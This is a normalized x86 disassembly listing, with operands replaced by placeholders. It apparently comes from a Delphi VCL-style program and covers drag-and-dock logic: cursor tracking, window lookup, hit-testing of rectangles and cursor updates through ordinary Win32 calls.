call sub_433018
jmp r-xdata
mov eax [ rw-data ]
add eax 0xc
call sub_4329a0
jmp r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al 0x1
call sub_433018
jmp r-xdata
sub eax 0x3
je r-xdata
jmp r-xdata
sub_431fc7
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
call sub_4544c0
call sub_4038e8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor eax eax
call sub_433018
sub_432020
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_43204a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4320b0
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_431e5c
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
pop esi
pop ebx
retn
mov eax [ esi + 0x38 ]
mov [ ebx + 0x38 ] eax
sub_4320dc
push ebp
mov ebp esp
push ecx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffdd
call sub_4032f4
pop edi
pop esi
pop ecx
pop ebp
retn 0x4
sub_432108
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi ecx
mov ebx eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov eax [ ebp + 0xc ]
push eax
mov ecx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x24 ]
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ ebx + 0x38 ]
mov si 0xffdf
call sub_4032f4
xor edx edx
sub_432160
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_43ce94
sub_432180
push ebx
mov ebx eax
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
test eax eax
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
mov edx [ eax ]
call [ edx + 0x4c ]
call sub_43ce7c
sub_4321a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_43208c
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d34c
mov esi eax
mov [ ebx + 0x40 ] esi
mov edx 0xffffff
xor eax eax
call sub_4223a0
mov edx eax
mov eax esi
call sub_41d4c8
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_403404
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
call sub_40345c
pop [ fs : 0x0 ]
add esp 0xc
sub_432208
push ebx
push esi
call sub_40346c
mov ebx edx
mov esi eax
mov eax [ esi + 0x40 ]
call sub_4030f8
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4030e8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403454
sub_432238
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_4320b0
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax esi
mov dl [ eax + 0x54 ]
mov [ ebx + 0x54 ] dl
mov edx [ eax + 0x58 ]
mov [ ebx + 0x58 ] edx
mov dl [ eax + 0x6c ]
mov [ ebx + 0x6c ] dl
push esi
lea esi [ eax + 0x44 ]
lea edi [ ebx + 0x44 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push esi
lea esi [ eax + 0x5c ]
lea edi [ ebx + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx [ eax + 0x40 ]
mov eax [ ebx + 0x40 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
sub_432294
push ebp
mov ebp esp
push esi
push edi
mov edi edx
mov esi eax
mov eax [ ebp + 0x8 ]
push eax
mov edx edi
mov eax [ esi + 0x38 ]
mov si 0xffe5
call sub_4032f4
pop edi
pop esi
pop ebp
retn 0x4
sub_4322b8
push ebx
push esi
mov ebx edx
mov ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
mov esi eax
mov eax ebx
cdq
xor eax edx
sub eax edx
cmp esi eax
jge r-xdata
mov eax ebx
pop esi
pop ebx
retn
mov eax ecx
pop esi
pop ebx
retn
sub_4322dc
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
lea edi [ esp ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov ebx eax
mov eax [ ebx + 0xc ]
mov edx [ esp ]
cmp eax edx
jl r-xdata
sub edx eax
mov ecx [ esp + 0x8 ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_4322b8
mov esi eax
jmp r-xdata
cmp eax [ esp + 0x8 ]
jle r-xdata
mov eax [ ebx + 0x10 ]
mov edx [ esp + 0x4 ]
cmp eax edx
jl r-xdata
xor esi esi
sub edx eax
mov ecx [ esp + 0xc ]
sub ecx eax
mov eax ecx
xchg edx eax
call sub_4322b8
jmp r-xdata
cmp eax [ esp + 0xc ]
jle r-xdata
test esi esi
jne r-xdata
xor eax eax
neg eax
push eax
neg esi
push esi
lea eax [ ebx + 0x44 ]
push eax
call OffsetRect
test eax eax
je r-xdata
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_432398
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
mov edi ebx
cmp esi [ edi + 0x4 ]
jne r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
mov edx ebx
cmp esi [ edx + 0x8 ]
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
push [ edi + 0x10 ]
push [ edi + 0xc ]
lea eax [ ebp - 0x10 ]
push eax
call PtInRect
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
cmp esi [ edx ]
jne r-xdata
xor eax eax
mov [ edx + 0x14 ] 0x1
jmp r-xdata
mov [ edi + 0x8 ] esi
or eax 0xffffffff
or eax 0xffffffff
xor ecx ecx
mov [ edx + 0x8 ] ecx
jmp r-xdata
sub_432404
push ebp
mov ebp esp
add esp 0xffffffc4
push ebx
push esi
push edi
mov ebx eax
mov [ ebp - 0x1 ] 0x1
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
call sub_432854
mov esi eax
mov [ ebp - 0x14 ] esi
push 0x4
push esi
call GetWindow
mov edx [ rw-data ]
mov edx [ edx ]
cmp eax [ edx + 0x30 ]
je r-xdata
cmp [ ebp - 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_431970
mov esi eax
test esi esi
je r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov esi ebx
jmp r-xdata
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
mov esi eax
mov eax esi
call sub_43b290
mov edi eax
mov [ ebp - 0x18 ] edi
cmp edi [ ebp - 0x14 ]
je r-xdata
mov esi eax
mov eax esi
call sub_43b290
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov eax [ eax + 0x30 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov edx [ ebp + 0x8 ]
mov esi eax
jmp r-xdata
xor eax eax
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_43b290
mov [ ebp - 0x1c ] eax
jmp r-xdata
mov eax [ esi + 0x30 ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x14 ]
push eax
call GetWindowRect
mov eax [ ebp + 0x8 ]
add eax 0xfffffff7
push eax
mov eax [ ebp + 0x8 ]
dec eax
push eax
lea ecx [ ebp - 0x3c ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x10 ]
mov eax ebx
mov si 0xffbd
call sub_4032f4
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov [ ebp - 0x8 ] 0x0
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x9 ]
mov [ ebp - 0x10 ] edx
mov edx [ eax - 0x5 ]
mov [ ebp - 0xc ] edx
lea eax [ ebp - 0x1c ]
push eax
push sub_432398
call GetCurrentThreadId
push eax
call EnumThreadWindows
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov esi eax
mov eax esi
call sub_43b290
mov [ ebp - 0x1c ] eax
jmp r-xdata
lea eax [ ebp - 0x3c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x2c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
cmp [ eax + 0xa0 ] 0x0
je r-xdata
mov [ ebp - 0x1 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x38 ]
mov eax [ eax + 0xa0 ]
call sub_43b290
cmp eax [ ebp - 0x14 ]
je r-xdata
sub_43259c
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
xor eax eax
pop ebp
retn
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x14 ]
call sub_43b290
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x10 ]
call sub_43b290
push eax
call IsChild
cmp eax 0x1
sbb eax eax
inc eax
pop ebp
retn
sub_4325e0
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
mov esi eax
lea edi [ ebp - 0x9 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x10 ] edx
xor eax eax
mov [ ebp - 0x18 ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x18 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x11
call GetKeyState
test ax 0x8000
setne al
mov edx [ rw-data ]
mov edx [ edx ]
xor al [ edx + 0xb4 ]
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax [ rw-data ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x8 ] 0x0
jle r-xdata
inc ebx
xor edi edi
cmp [ ebp - 0x18 ] 0x0
je r-xdata
mov eax [ rw-data ]
call sub_431df8
mov [ ebp - 0x18 ] eax
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x1a6 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x18 ]
call sub_432404
pop ecx
test al al
jne r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_4139f4
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x14 ]
cmp eax [ ebp - 0x10 ]
je r-xdata
mov eax [ ebp - 0x14 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
je r-xdata
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebp - 0x14 ]
call sub_43b290
push eax
call IsWindowVisible
test eax eax
je r-xdata
push ebp
call sub_43259c
pop ecx
test al al
jne r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0xa0 ]
cmp eax [ ebp - 0x14 ]
jne r-xdata
mov [ ebp - 0x1 ] 0x1
lea eax [ ebp - 0x9 ]
push eax
lea eax [ ebp - 0x1 ]
push eax
lea ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x10 ]
mov eax [ ebp - 0x14 ]
mov si 0xffbd
call sub_4032f4
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov eax [ ebp - 0x14 ]
call sub_439dc0
dec eax
jle r-xdata
push [ ebp - 0x5 ]
push [ ebp - 0x9 ]
lea eax [ ebp - 0x28 ]
push eax
call PtInRect
test eax eax
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_431d68
sub_43273c
push ebx
push esi
push edi
mov ebx edx
mov esi eax
test esi esi
je r-xdata
pop edi
pop esi
pop ebx
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov edi esi
mov edx edi
mov eax [ rw-data ]
call sub_413a50
test bl bl
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
inc eax
jne r-xdata
mov edx eax
mov eax [ rw-data ]
call sub_4138e4
mov edx edi
mov eax [ rw-data ]
call sub_413898
jmp r-xdata
sub_43279c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov [ ebp - 0x4 ] ecx
xor ecx ecx
test eax eax
je r-xdata
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov ecx [ ebp + 0x8 ]
mov ebx [ ecx ]
mov [ ebp - 0x18 ] ebx
mov ebx [ ecx + 0x4 ]
mov [ ebp - 0x14 ] ebx
mov ecx [ ebp + 0xc ]
mov [ ebp - 0xc ] ecx
mov ecx [ ebp - 0x4 ]
mov [ ebp - 0x10 ] ecx
cmp [ rw-data ] 0x2
sete cl
mov [ ebp - 0x8 ] cl
lea ecx [ ebp - 0x18 ]
push ecx
and edx 0x7f
push edx
push 0xb02f
push eax
call SendMessageA
mov ecx eax
sub_4327f4
push ebx
push esi
push ecx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop edx
pop esi
pop ebx
retn
push esp
push esi
call GetWindowThreadProcessId
test eax eax
je r-xdata
call GetCurrentProcessId
cmp eax [ esp ]
jne r-xdata
mov eax [ rw-data ]
call sub_404374
push eax
call GlobalFindAtomA
cmp ax [ rw-data ]
jne r-xdata
mov eax esi
call sub_43193c
test eax eax
setne bl
movzx eax [ rw-data ]
push eax
push esi
call GetPropA
test eax eax
setne bl
jmp r-xdata
sub_432854
push ebx
push [ eax + 0x4 ]
push [ eax ]
call WindowFromPoint
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
call sub_4327f4
test al al
jne r-xdata
push ebx
call GetParent
mov ebx eax
test ebx ebx
jne r-xdata
sub_432880
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
test cl cl
jne r-xdata
mov eax ebx
mov edx [ ebp + 0x8 ]
call sub_4325e0
mov ebx eax
test ebx ebx
je r-xdata
mov eax ebx
call sub_432854
mov [ esi ] eax
push 0x0
push ebx
mov eax [ esi ]
mov ecx [ rw-data ]
mov dl 0x5
call sub_43279c
mov ebx eax
jmp r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn 0x4
mov eax ebx
call sub_43b290
mov [ esi ] eax
sub_4328d0
push ebx
push esi
mov ebx eax
xor eax eax
mov edx [ rw-data ]
mov esi [ edx + 0x4 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
push esi
mov eax [ rw-data ]
add eax 0xc
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x8 ]
mov ecx [ rw-data ]
mov edx ebx
call sub_43279c
cmp eax 0x1
sbb eax eax
inc eax
sub_43290c
push ebx
push esi
push edi
xor edi edi
mov eax [ rw-data ]
mov esi [ eax + 0x4 ]
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
cmp [ esi + 0x1a7 ] 0x0
je r-xdata
cmp [ esi + 0x178 ] 0x0
je r-xdata
mov eax esi
call sub_439d2c
test eax eax
je r-xdata
mov eax esi
call sub_439d2c
dec eax
jne r-xdata
mov eax [ rw-data ]
add eax 0xc
xor edx edx
call sub_43333c
mov ebx eax
jmp r-xdata
xor edx edx
mov eax [ esi + 0x178 ]
call sub_4139f4
mov edx [ rw-data ]
cmp eax [ edx + 0x38 ]
je r-xdata
test ebx ebx
je r-xdata
cmp esi ebx
jne r-xdata
mov edx ebx
mov eax [ esi + 0x178 ]
call sub_413a50
cmp eax 0xffffffff
je r-xdata
mov ebx [ ebx + 0x30 ]
mov edx eax
mov eax esi
call sub_439d40
mov edi eax
jmp r-xdata
sub_4329a0
push ebx
push esi
push edi
add esp 0xfffffff0
mov edi eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
mov eax [ rw-data ]
mov cl [ eax + 0x9b ]
lea edx [ esp + 0x4 ]
mov eax edi
call sub_432880
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
sub eax [ edi ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jge r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x9b ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
sub eax [ edi + 0x4 ]
cdq
xor eax edx
sub eax edx
cmp eax [ rw-data ]
jl r-xdata
cmp [ rw-data ] 0x0
setne [ esp + 0x4 ]
mov [ rw-data ] 0x2
mov [ rw-data ] 0x1
mov [ esp + 0x4 ] 0x0
jmp r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_43cd50
add esp 0x10
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov al 0x1
call sub_4328d0
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
cmp ebx [ eax + 0x4 ]
je r-xdata
mov eax [ edi + 0x4 ]
push eax
mov al 0x2
call sub_4328d0
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
mov esi [ eax ]
call [ esi + 0x4 ]
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
call sub_4345d4
mov eax [ rw-data ]
mov edx [ esp + 0x8 ]
mov [ eax + 0x14 ] edx
mov edx [ esp + 0xc ]
mov [ eax + 0x18 ] edx
mov eax [ rw-data ]
mov [ eax + 0x4 ] ebx
mov eax [ rw-data ]
mov edx [ esp ]
mov [ eax + 0x8 ] edx
mov eax [ rw-data ]
mov edx [ edi ]
mov [ eax + 0xc ] edx
mov edx [ edi + 0x4 ]
mov [ eax + 0x10 ] edx
xor eax eax
call sub_4328d0
cmp [ rw-data ] 0x0
je r-xdata
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_452428
push eax
call SetCursor
cmp [ rw-data ] 0x2
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
jne r-xdata
mov edx esi
mov eax [ rw-data ]
call sub_43cd38
mov eax [ rw-data ]
cmp [ eax + 0x6a ] 0x0
jne r-xdata
test [ ebx + 0x51 ] 0x20
je r-xdata
call sub_43290c
mov ebx eax
mov eax [ rw-data ]
mov [ eax + 0x58 ] ebx
test ebx ebx
jne r-xdata
mov edx [ edi + 0x4 ]
push edx
mov ecx [ edi ]
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
xchg edx eax
mov si 0xffe7
call sub_4032f4
jmp r-xdata
mov ecx [ edi + 0x4 ]
mov edx [ edi ]
mov eax [ rw-data ]
call sub_43ce38
jmp r-xdata
mov eax [ edi + 0x4 ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ edi ]
mov eax [ rw-data ]
call sub_43cd50
jmp r-xdata
mov eax [ rw-data ]
call sub_43ceac
movsx edx si
mov eax [ rw-data ]
mov eax [ eax ]
call sub_452428
push eax
call SetCursor
lea ecx [ esp + 0x8 ]
mov edx edi
mov eax ebx
call sub_4345d4
lea edx [ esp + 0x8 ]
mov eax ebx
mov si 0xffd8
call sub_4032f4
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
mov eax [ rw-data ]
lea edx [ eax + 0x14 ]
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov si 0xffd8
call sub_4032f4
mov edx [ rw-data ]
mov [ edx + 0x54 ] al
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov ebx [ rw-data ]
lea edx [ ebx + 0x5c ]
lea eax [ ebx + 0x44 ]
mov ecx 0x10
call sub_407a40
test al al
jne r-xdata
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x30 ]
mov eax [ rw-data ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x34 ]
sub_432c70
push ebx
push esi
push edi
add esp 0xfffffff8
mov edi ecx
mov ebx edx
mov esi eax
mov [ rw-data ] esi
mov eax [ rw-data ]
xor edx edx
mov [ eax + 0x4 ] edx
push rw-data
call GetCursorPos
mov eax [ rw-data ]
mov edx [ rw-data ]
mov [ eax + 0xc ] edx
mov edx [ rw-data ]
mov [ eax + 0x10 ] edx
call GetCursor
mov [ rw-data ] eax
mov eax [ rw-data ]
call sub_431e9c
mov [ rw-data ] eax
mov [ rw-data ] edi
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
test bl bl
je r-xdata
mov edx esi
lea eax [ edx + 0x44 ]
mov edi [ eax + 0x8 ]
mov ecx [ eax ]
sub edi ecx
test edi edi
jle r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x1
jmp r-xdata
xor ecx ecx
mov [ edx + 0x20 ] ecx
mov [ edx + 0x24 ] ecx
mov edi [ edx + 0xc ]
sub edi ecx
mov [ esp ] edi
fild [ esp ]
mov ecx [ eax + 0x8 ]
sub ecx [ eax ]
mov [ esp + 0x4 ] ecx
fild [ esp + 0x4 ]
fdivp st1
fstp [ edx + 0x20 ]
fwait
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4030c8
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
push eax
call GetDesktopWindow
mov edx eax
mov ecx [ rw-data ]
mov eax [ rw-data ]
call sub_43cd50
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ esi + 0x28 ] eax
mov [ esi + 0x2c ] eax
mov ecx esi
mov edi [ ecx + 0x10 ]
sub edi edx
mov [ esp ] edi
fild [ esp ]
mov edx [ eax + 0xc ]
sub edx [ eax + 0x4 ]
mov [ esp + 0x4 ] edx
fild [ esp + 0x4 ]
fdivp st1
fstp [ ecx + 0x28 ]
fwait
jmp r-xdata
mov ecx [ eax + 0xc ]
mov edx [ eax + 0x4 ]
sub ecx edx
test ecx ecx
jle r-xdata
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax rw-data
call sub_4329a0
mov [ rw-data ] 0x0
jmp r-xdata
mov [ rw-data ] 0x2
mov eax esi
mov edx [ eax ]
call [ edx + 0x30 ]
jmp r-xdata
test bl bl
je r-xdata
sub_432de0
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov edi eax
mov [ rw-data ] edi
xor edx edx
push ebp
push sub_432f85
push [ fs : edx ]
mov [ fs : edx ] esp
xor eax eax
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x0
cmp [ edi + 0x9b ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffe3
call sub_4032f4
cmp [ rw-data ] 0x0
jne r-xdata
lea edx [ ebp - 0x8 ]
mov eax edi
mov si 0xffdc
call sub_4032f4
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4321a4
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x4 ]
mov edx ebx
mov eax [ ebp - 0x8 ]
call sub_432c70
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov ecx edi
mov dl 0x1
mov eax [ r-xdata ]
call sub_43208c
mov [ ebp - 0x8 ] eax
mov [ rw-data ] 0x1
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov esi [ eax + 0x38 ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
add eax 0x44
push eax
mov eax esi
call sub_43b290
push eax
call GetWindowRect
jmp r-xdata
lea ecx [ ebp - 0x20 ]
xor edx edx
xor eax eax
call sub_412598
lea edx [ ebp - 0x20 ]
lea ecx [ ebp - 0x18 ]
mov eax esi
call sub_4345a8
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x48 ] edx
mov eax esi
mov edx [ r-xdata ]
call sub_403284
test al al
jne r-xdata
mov eax [ ebp - 0x8 ]
lea esi [ eax + 0x44 ]
lea edi [ eax + 0x5c ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea eax [ ebp - 0x10 ]
push eax
call GetCursorPos
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x10 ]
mov [ eax + 0x44 ] edx
mov edx [ ebp - 0xc ]
mov [ eax + 0x48 ] edx
jmp r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ esi + 0x48 ]
mov eax [ ebp - 0x8 ]
mov edi [ eax + 0x38 ]
add edx [ edi + 0x4c ]
mov eax [ esi + 0x44 ]
add eax [ edi + 0x48 ]
lea ecx [ ebp - 0x18 ]
call sub_412598
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x18 ]
mov [ eax + 0x4c ] edx
mov edx [ ebp - 0x14 ]
mov [ eax + 0x50 ] edx
sub_432fa4
push ebp
mov ebp esp
push ebx
push esi
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
setne bl
mov eax [ ebp + 0x8 ]
cmp [ eax - 0x1 ] 0x0
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ebp
retn
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
jne r-xdata
mov bl 0x1
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax + 0xa0 ] 0x0
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax + 0xa0 ]
test eax eax
je r-xdata
mov edx [ rw-data ]
mov edx [ edx + 0x4 ]
mov ecx [ rw-data ]
mov si 0xffbe
call sub_4032f4
mov ebx eax
sub_433018
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
mov [ ebp - 0x1 ] al
xor ebx ebx
mov [ ebp - 0x2 ] 0x0
cmp [ rw-data ] 0x0
je r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
cmp [ eax + 0x30 ] 0x0
jne r-xdata
xor edx edx
push ebp
push sub_4332e4
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ rw-data ] eax
xor edx edx
push ebp
push sub_433272
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
mov [ eax + 0x30 ] 0x1
mov eax [ rw-data ]
mov dl [ ebp - 0x1 ]
mov [ eax + 0x1c ] dl
mov edx [ rw-data ]
mov eax [ rw-data ]
call sub_431ee4
cmp [ rw-data ] 0x2
jne r-xdata
mov eax [ rw-data ]
cmp [ eax + 0x4 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov edx [ r-xdata ]
call sub_4032a8
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x34 ]
cmp [ ebx + 0x4 ] 0x0
sete al
mov [ ebx + 0x6c ] al
mov eax [ rw-data ]
mov edx [ eax + 0xc ]
mov [ ebp - 0xa ] edx
mov edx [ eax + 0x10 ]
mov [ ebp - 0x6 ] edx
mov eax [ rw-data ]
mov eax [ eax + 0x4 ]
mov edx [ r-xdata ]
call sub_403284
test al al
je r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] 0x2
